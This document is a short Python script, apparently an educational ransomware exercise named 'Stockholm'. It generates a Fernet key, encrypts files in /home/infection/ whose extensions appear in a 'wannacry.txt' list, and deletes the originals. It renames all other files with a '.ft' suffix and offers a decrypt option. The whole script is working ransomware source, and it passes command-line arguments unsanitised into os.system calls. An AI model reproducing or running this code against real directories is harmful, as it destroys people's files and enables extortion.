#############
# Libraries #
#############

from cryptography.fernet import Fernet
import sys
import os

#############
# Functions #
#############

def display_help():
    print()
    print("Execution: ./stockholm [-hvrs]")
    print("  -h -help:    program info")
    print("  -v -version: program version")
    print("  -r -reverse: reverse the encryption")
    print("  -s -silent:  mute encrypted files")
    print()
    return

def encrypt_data(message):
    with open(".key", "rb") as f:
        key = f.read()
    key = Fernet(key)
    data = key.encrypt(message)
    return data

########################################
# Program: python encrypt.py H V R S K #
########################################

if len(sys.argv) != 6:
    print("Error: (input)")
    exit(1)

if sys.argv[1] == "H":
    display_help()
    exit(0)

if sys.argv[2] == "V":
    print("Stockholm 1.0")
    exit(0)

if sys.argv[3] == "R":
    os.system("python3 decrypt.py " + sys.argv[4] + " " + sys.argv[5])
    exit(0)

os.system("python3 gen_key.py .key")

files = os.listdir("/home/infection/")

with open("wannacry.txt", "rb") as f:
    extensions = f.read()
extensions = extensions.split()

for item in files:
    item_ext = os.path.splitext(item)[1]
    if item_ext.encode() in extensions:
        with open("/home/infection/" + item, "rb") as f:
            content = f.read()
        with open("/home/infection/" + item + ".ft", "wb") as f:
            f.write(encrypt_data(content))
        os.remove("/home/infection/" + item)
        if sys.argv[4] != "S":
            print("/home/infection/" + item + "  ->  /home/infection/" + item + ".ft")
    elif item_ext != ".ft":
        os.rename("/home/infection/" + item, "/home/infection/" + item + ".ft")
        if sys.argv[4] != "S":
            print("/home/infection/" + item + "  ->  /home/infection/" + item + ".ft")
